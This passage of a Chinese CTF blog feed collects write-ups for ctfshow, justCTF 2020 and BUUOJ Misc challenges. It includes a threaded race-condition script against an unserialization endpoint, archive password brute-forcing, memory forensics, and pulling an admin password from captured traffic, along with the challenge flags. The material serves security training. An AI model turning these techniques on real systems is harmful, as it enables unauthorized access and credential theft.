class="string">&#x27;O:5:&quot;Unser&quot;:2:&#123;s:8:&quot;username&quot;;s:7:&quot;ctfshow&quot;;s:8:&quot;password&quot;;i:0;&#125;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        requests.get(url=<span class="string">&quot;&#123;&#125;ctfshowgetflaghhhh&quot;</span>.<span class="built_in">format</span>(ENV),params=param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetFlag</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Get flag thread lanched&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = requests.get(url=<span class="string">&quot;&#123;&#125;flag.txt&quot;</span>.<span class="built_in">format</span>(ENV))</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;install.php&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Found flag in &#123;&#125;&quot;</span>.<span class="built_in">format</span>(response.content.decode(<span class="string">&quot;UTF-8&quot;</span>)))</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] Get flag thread retry&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">event = threading.Event()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    threading.Thread(target=Unserialization, args=()).start()</span><br><span class="line">    threading.Thread(target=GetFlag, args=()).start()</span><br></pre></td></tr></table></figure><p>运行可以得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;229c1b86-f183-4520-8792-1e78448dad62&#125;</span><br></pre></td></tr></table></figure><h3 id="虎山行’s-revenge"><a href="#虎山行’s-revenge" class="headerlink" title="虎山行’s revenge"></a>虎山行’s revenge</h3><p>跟虎山行相比，目录有所变更。</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- ctfshowsecretfilehh</span></span><br><span class="line"><span class="addition">+ hsxhsxhsxctfshowsecretfilel</span></span><br></pre></td></tr></table></figure><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- ctfshowgetflaghhhh</span></span><br><span class="line"><span class="addition">+ hsxctfshowsecretgetflagl</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;5a01f428-4ffa-44bc-aab5-571d5ebbfaa6&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>justCTF 2020</title>
      <link href="/zh-CN/posts/5b5c6f4d.html"/>
      <url>/zh-CN/posts/5b5c6f4d.html</url>
      
        <content type="html"><![CDATA[<h3 id="Sanity-Check"><a href="#Sanity-Check" class="headerlink" title="Sanity Check"></a>Sanity Check</h3><p>给出的链接是 <code>Rule The World</code> 的播放链接。而网站上的 RULES 里面有 <code>All flags fall into the following format: justCTF&#123;something_h3re!&#125;, unless the challenge description states otherwise.</code> 的描述。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">justCTF&#123;something_h3re!&#125;</span><br></pre></td></tr></table></figure><h3 id="PDF-is-broken-and-so-is-this-file"><a href="#PDF-is-broken-and-so-is-this-file" class="headerlink" title="PDF is broken, and so is this file"></a>PDF is broken, and so is this file</h3><p>使用 010 editor 打开所给的 pdf 可以发现其中隐藏了很多文件。foremost 分离出来，在 zip 目录下发现可以解压的压缩文档。其中包含一个工具和如下说明。</p><blockquote><p>You didn’t think it would be this easy, did you?</p><p><a href="https://www.youtube.com/watch?v=VVdmmN0su6E#t=11m32s">https://www.youtube.com/watch?v=VVdmmN0su6E#t=11m32s</a></p><p>Maybe try running <code>./mutool draw -r 300 -o rendered.png</code> on this PDF</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;$ docker run -ti --rm -w /workdir/ --mount <span class="built_in">type</span>=<span class="built_in">bind</span>,<span class="built_in">source</span>=<span class="string">&quot;<span class="variable">$PWD</span>&quot;</span>,target=/workdir ubuntu:bionic ./mutool </span><br></pre></td></tr></table></figure></blockquote><p>按照提示所给的信息运行 mutool 可以生成一张图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/f8f4ba93-7e20-4518-91da-26d067ee93f9/1613214058732567.0130fefdb8fa91c1f87c2119abe9938533e2d888.png"></p><blockquote><p><strong>LMGTFY</strong>: Let Me Google That For You</p></blockquote><p>在搜索引擎上找 <code>2642 didier &quot;42 bytes&quot; object</code>，可以发现一篇<a href="https://blog.didierstevens.com/2008/05/19/pdf-stream-objects/">文章</a>，讲的是 PDF Stream。读完之后回到 PDF 文件上，找一下 PDF 文件的 Stream。从每一个流的头部可以找到流的类型，长度以及过滤器。如果是图片，还能看到更多信息。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/f8f4ba93-7e20-4518-91da-26d067ee93f9/1613214058858571.7b183b16d28c8595a01a0230ddd0a27e77c1c233.png"></p><p>参照这篇<a href="https://www.oreilly.com/library/view/developing-with-pdf/9781449327903/ch01.html">文章</a>可知 stream 必须要有一个 generation，查找流的时候可以发现有两个流使用了同一个 object ID，不同的 generation，而这个属性通常为 0。所以猜测 generation 为 1 的 stream 中藏有不同寻常的内容。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/f8f4ba93-7e20-4518-91da-26d067ee93f9/1613214059007807.1525865c05e980f081355369d01ddd1da8390b9c.png"></p><p><img src="https://butter.lumosary.workers.dev/images/archive/f8f4ba93-7e20-4518-91da-26d067ee93f9/1613214059130850.c3cc6000e5f88d1f8cb72b4a134c6f01d70097ff.png"></p><p>这个区块的 filter 有 <code>[/FlateDecode /ASCIIHexDecode /DCTDecode]</code> 这三个，因此需要提取出来之后再依次解码，这里的 FlateDecode 可以直接使用 <code>binwalk -e</code> 分离出来，找到最近的块的文件，即可得到 ASCIIHexDecode 之前的文件。将其使用 <code>From Hex</code> 解码即可得到一张 jpg 文件。将其渲染出来查看即可得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/f8f4ba93-7e20-4518-91da-26d067ee93f9/1613214059305807.b26040cd3d4d825c68a41b73475508573db4f2de.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">justCTF&#123;BytesAreNotRealWakeUpSheeple&#125;</span><br></pre></td></tr></table></figure><h3 id="Forgotten-name"><a href="#Forgotten-name" class="headerlink" title="Forgotten name"></a>Forgotten name</h3><p>在这个<a href="https://crt.sh/">网站</a>上使用顶级域名搜索可以找到这样一个三级域名。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/f8f4ba93-7e20-4518-91da-26d067ee93f9/1613214059470552.a55a29fa9af79b4d12538d70546b17a0d68c9f62.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;6a7573744354467b633372545f6c34616b735f6f3070737d.web.jctf.pro&#x2F;</span><br></pre></td></tr></table></figure><p>访问它可以得到如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OH! You found it! Thank you &lt;3</span><br></pre></td></tr></table></figure><p>将所得到的域名的第一段，即 <code>6a7573744354467b633372545f6c34616b735f6f3070737d</code>，经过 <code>From Hex</code> 的解码之后可以得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">justCTF&#123;c3rT_l4aks_o0ps&#125;</span><br></pre></td></tr></table></figure><h3 id="Computeration"><a href="#Computeration" class="headerlink" title="Computeration"></a>Computeration</h3><p>report 页面有一个提交网址的页面，提交之后会有 bot 去访问页面，因此想到监听请求。使用这个<a href="https://webhook.site/">网站</a>监听一下请求。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/f8f4ba93-7e20-4518-91da-26d067ee93f9/1613214059627984.768bf66c82082b698a669b58ff431f15c60eeb90.png"></p><p>很容易发现 referer 里面有一个网址，整理一下得到如下网址。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://computeration.web.jctf.pro/b811667a5a09db734093a974111d750e</span><br></pre></td></tr></table></figure><p>尝试访问一下发现被跳转了。使用某在线工具请求一下，可以得到如下结果。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    </span><br><span class="line">    localStorage.setItem(&#39;notes&#39;,JSON.stringify([&#123;</span><br><span class="line">        title:&#39;flag&#39;,</span><br><span class="line">        content:&#39;justCTF&#123;cross_origin_timing_lol&#125;&#39;</span><br><span class="line">    &#125;]));</span><br><span class="line">    </span><br><span class="line">    location &#x3D; (new URL(location.href)).searchParams.get(&#39;url&#39;);</span><br><span class="line"></span><br><span class="line">    &lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">justCTF&#123;cross_origin_timing_lol&#125;</span><br></pre></td></tr></table></figure><h3 id="Remote-Password-Manager"><a href="#Remote-Password-Manager" class="headerlink" title="Remote Password Manager"></a>Remote Password Manager</h3><p>Volatility 2 跑一下 imageinfo，得到如下结果。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/f8f4ba93-7e20-4518-91da-26d067ee93f9/1613214059839653.9c0230bb8a442f9d67f456779c9c9d89dd5e01fe.png"></p><p>既然题目说 Remote，那就要找一下远程的程序。先跑一下 pslist 看一下进程列表。可以发现两个可疑进程。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/f8f4ba93-7e20-4518-91da-26d067ee93f9/1613214059963648.e56244e9c717c932f0f6c4e1a24036e65b43faec.png"></p><p>使用 cmdline 先读一下命令行的历史，发现没有值得深入的地方。于是将 mstsc.exe 这个进程的部分 dump 下来。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f challenge.vmem --profile&#x3D;Win10x64_18362 memdump -p 6484 -D .&#x2F;</span><br></pre></td></tr></table></figure><p>放到 Kali 下使用 GIMP 直接打开 raw data，调整宽高可以看到如下图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/f8f4ba93-7e20-4518-91da-26d067ee93f9/1613214060205861.f1a7ad7cb4184481e7bbeb46b5ebc5a6005d1ef9.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">justCTF&#123;7h3r3_15_n0_5uch_7h1n6_45_unh4ck4bl3&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>[Pending] BUUOJ Misc</title>
      <link href="/zh-CN/posts/d24ddcdd.html"/>
      <url>/zh-CN/posts/d24ddcdd.html</url>
      
        <content type="html"><![CDATA[<h3 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h3><p>Photoshop 打开后调出时间轴，可见三张图。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213880982856.5ec86ac67fe253bdcc1b4565ef478b6ecea456ca.png"><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213881139866.c9aa57b1f6dea4cd74ad285de3921ce145d1147b.png"><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213881222910.f5d51543e0c368d187098206e4137990774a6b44.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;he11ohongke&#125;</span><br></pre></td></tr></table></figure><h3 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h3><p>binwalk 一下发现文件末尾有压缩包，<code>binwalk -e</code> 提取出来。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213881350455.11ade27ed6e2db98ee54c6bd8a50ba1ab5a0a939.png"></p><p>根据 <code>4 number</code> 的提示，使用 ARCHPR 爆破压缩包密码。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213881523202.18162c62e3811904dbe0cfaf16b6beb942e471fc.png"></p><p>得到密码为 7639，解压得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;vjpw_wnoei&#125;</span><br></pre></td></tr></table></figure><h3 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h3><p>没法正常运行的 exe 文件，010 editor 打开，发现只是一张 base64 的图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213881728647.3f5403f2fee78476ae0d1e5d5b65f240cb43a08d.png"></p><p>解码之后得到一个二维码。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213881833154.4000a2d34dc8c6f4006adba32e158bb4679c94ab.png" alt="img"></p><p>扫码得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KEY&#123;dca57f966e4e4e31fd5b15417da63269&#125;</span><br></pre></td></tr></table></figure><h3 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h3><p>用 010 editor 打开图片，运行模板发现 CRC 校验错误，猜测是图片宽高被修改。用脚本跑出宽高。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">crcbp = <span class="built_in">open</span>(<span class="string">&quot;dabai.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span>(crc32 == <span class="number">0x6D7C7135</span>):</span><br><span class="line">            <span class="built_in">print</span>(i, j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;hex:&#x27;</span>, <span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))</span><br></pre></td></tr></table></figure><p>得到高度应为 <code>01 DF</code>，对应修改得到原图。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213882010808.8ce7b52f2566aad597daad5f732788a83fcc40a4.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Heql0_d4_ba1&#125;</span><br></pre></td></tr></table></figure><h3 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h3><p>用 010 editor 打开图片可发现文件的末尾有 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213882110247.c603dfa4ab8bacca805fed06792ad395befe347f.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;stego_is_s0_bor1ing&#125;</span><br></pre></td></tr></table></figure><h3 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h3><p>根据题目描述可知压缩包的密码为四位数字。ARCHPR 爆破得到密码 2563。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213882269292.151131f923bdf8701e3ba48453ce8398c3230fa8.png"></p><p>解压可得到一串 base64。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3s3MDM1NDMwMGE1MTAwYmE3ODA2ODgwNTY2MWI5M2E1Y30&#x3D;</span><br></pre></td></tr></table></figure><p>解码可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;70354300a5100ba78068805661b93a5c&#125;</span><br></pre></td></tr></table></figure><h3 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h3><p>用 010 editor 打开图片可发现文件的末尾有 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213882379728.408e67ed82854beb7868f6015545b32db73ba793.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;97314e7864a8f62627b26f3f998c37f1&#125;</span><br></pre></td></tr></table></figure><h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h3><p>使用 StegSolve 解得 LSB 下存在 PNG 文件。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213882532022.291bc8b358050b101eda3f20fd57b37bbb9fc3b2.png"></p><p>提取出来得到一个二维码，扫描之后得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cumtctf&#123;1sb_i4_s0_Ea4y&#125;</span><br></pre></td></tr></table></figure><h3 id="图片中的秘密"><a href="#图片中的秘密" class="headerlink" title="图片中的秘密"></a>图片中的秘密</h3><p>用 010 editor 打开文件，在数据帧中可以找到 flag.</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213882641440.cf498a25c4e8622ae931d460a5d247b3ff99b2c6.png" alt=" "></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;870c5a72806115cb5439345d8b014396&#125;</span><br></pre></td></tr></table></figure><h3 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h3><p>根据题目描述可知压缩包的密码为四位数字。ARCHPR 爆破得到密码 8795。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213882796706.9598e6b4b14c5ddb7df6c63baf6f466b943cbe03.png"></p><p>解压可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1773c5da790bd3caff38e3decd180eb7&#125;</span><br></pre></td></tr></table></figure><h3 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h3><p>使用 wireshark 打开流量包，筛选 http 条目。根据提示可知要找管理员密码。找到登录的 POST 请求，可以看到管理员密码。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213882938136.242558d095b94d177467e9de2d85df990f71a509.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ffb7567a1d4f4abdffdb54e022f8facd&#125;</span><br></pre></td></tr></table></figure><h3 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h3><p>扫描二维码得出 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag&#123;878865ce73370a4ce607d21ca01b5e59&#125;</span><br></pre></td></tr></table></figure><h3 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h3><p>010 editor 打开文件，修改 <code>frFlags</code> 和 <code>deFlags</code>为 <code>00</code> 即可去除伪加密。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213883055961.bd5ab34a5a9afdf24028924003bb35ef54023616.png" alt=" "></p><p>解压即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Adm1N-B2G-kU-SZIP&#125;</span><br></pre></td></tr></table></figure><h3 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h3><p>010 editor 查看文件可知文件尾部有压缩文件。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213883213009.34eca8c43134bb6dcf905db24483d06efcf38632.png"></p><p><code>binwalk -e</code> 分理出压缩包，根据题目描述猜测为四位数密码，用 ARCHPR 爆破得出解压密码为 8368。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213883300583.6ac4759653f6e1a81f0811a151b69a22ac8afddc.png"></p><p>解压出文件可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b025fc9ca797a67d2103bfbc407a6d5f&#125;</span><br></pre></td></tr></table></figure><h3 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h3><p>StegSolve 解 LSB 隐写可得信息。<img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213883403500.4451c1fce19e1e381805726b7b0cdb35a77b45b2.png" alt=" "></p><p>提取出来可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;st3g0_saurus_wr3cks&#125;</span><br></pre></td></tr></table></figure><h3 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h3><p>wireshark 分析流量包，筛选 http 条目可看到一个图片的 POST。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213883554240.46e75c476cd13e62cafa0941f1e14cf0193831e2.png"></p><p>提取出分组字节，用 010 editor 打开，可在文件尾部看到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213883653729.d2831b713c3ceb568f49d1d4855df10fa71ed2df.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;da73d88936010da1eeeb36e945ec4b97&#125;</span><br></pre></td></tr></table></figure><h3 id="小明的保险箱"><a href="#小明的保险箱" class="headerlink" title="小明的保险箱"></a>小明的保险箱</h3><p>010 editor 打开文件，文件尾部发现压缩文档。<code>binwalk -e</code> 分离出来。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213883779129.af82cb17734c319270ee0bea32889574f7aa7a36.png"></p><p>根据题目描述可知压缩包的密码为四位数字。ARCHPR 爆破得到密码 7869。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213883872899.4a22e6dad04ce66174f915e8d5d7b79d53c464bf.png"></p><p>解压出文件可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;75a3d68bf071ee188c418ea6cf0bb043&#125;</span><br></pre></td></tr></table></figure><h3 id="爱因斯坦"><a href="#爱因斯坦" class="headerlink" title="爱因斯坦"></a>爱因斯坦</h3><p>010 editor 打开解压的图片，文件尾部可以发现压缩文档。<code>binwalk -e</code> 分离出来。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213884031620.aced91835881cb2832b06f2424eeeb267453cff0.png" alt=" "></p><p>发现需要解压密码，同时在图片的备注中有 <code>this_is_not_password</code>。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213884129950.063dff29a52967ab9bc6456a723e19b6babee39b.png"></p><p>将其作为解压密码成功解压文件，即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dd22a92bf2cceb6c0cd0d6b83ff51606&#125;</span><br></pre></td></tr></table></figure><h3 id="easycap"><a href="#easycap" class="headerlink" title="easycap"></a>easycap</h3><p>Wireshark 打开流量包，发现全是 TCP 流，于是追踪 TCP 流，可得 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213884247242.f46b2f76eabe15f1e08ad9a4b20242e2bc864011.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;385b87afc8671dee07550290d16a8071&#125;</span><br></pre></td></tr></table></figure><h3 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h3><p>010 editor 打开文件，模板报错 <code>Missing End of File marker</code>，发现文件尾部有数据。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">01101011011011110110010101101011011010100011001101110011</span><br></pre></td></tr></table></figure><p>将其写作八位一组之后转 ASCII 可得 <code>koekj3s</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;koekj3s&#125;</span><br></pre></td></tr></table></figure><h3 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h3><p>StegSolve 解 LSB 隐写可发现一个压缩文件。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213884441462.4628fa03026c3213f55f585890e7f837709c3eca.png"></p><p>保存下来并去掉末尾的冗余数据，解压得到一个 ELF 文件。使用 Linux 终端运行可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hctf&#123;dd0gf4c3tok3yb0ard4g41n~~~&#125;</span><br></pre></td></tr></table></figure><h3 id="隐藏的钥匙"><a href="#隐藏的钥匙" class="headerlink" title="隐藏的钥匙"></a>隐藏的钥匙</h3><p>010 editor 打开文件可见 flag 提示。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213884569178.e5d908b72438bfabe7269e4e5a9134f0e622eac3.png"></p><p>提取出来之后 base64 解码可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;377cbadda1eca2f2f73d36277781f00a&#125;</span><br></pre></td></tr></table></figure><h3 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h3><p>图片中的盲文根据对照表解出为 <code>kmdonowg</code>。将其作为压缩包密码解密音频文件。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213884643132.37bbaf752504944bdc5eeac8f4829874ddff3b6c.png"></p><p>解压音频后可甄别是摩斯电码，使用 CwGet 接收可得文本。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213884770876.70d0bddf5a6c5a68ff8f90c1208d46d6b30ab141.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;wpei08732?23dz&#125;</span><br></pre></td></tr></table></figure><h3 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h3><p>根据题目描述可知压缩包的密码为四位数字。ARCHPR 爆破得到密码 5463。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213884856876.a44ec42d6b7a8c54d53344aa20492212238d91d8.png"></p><p>解压出来发现一个文本，使用 Brainfuck 解码之后得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 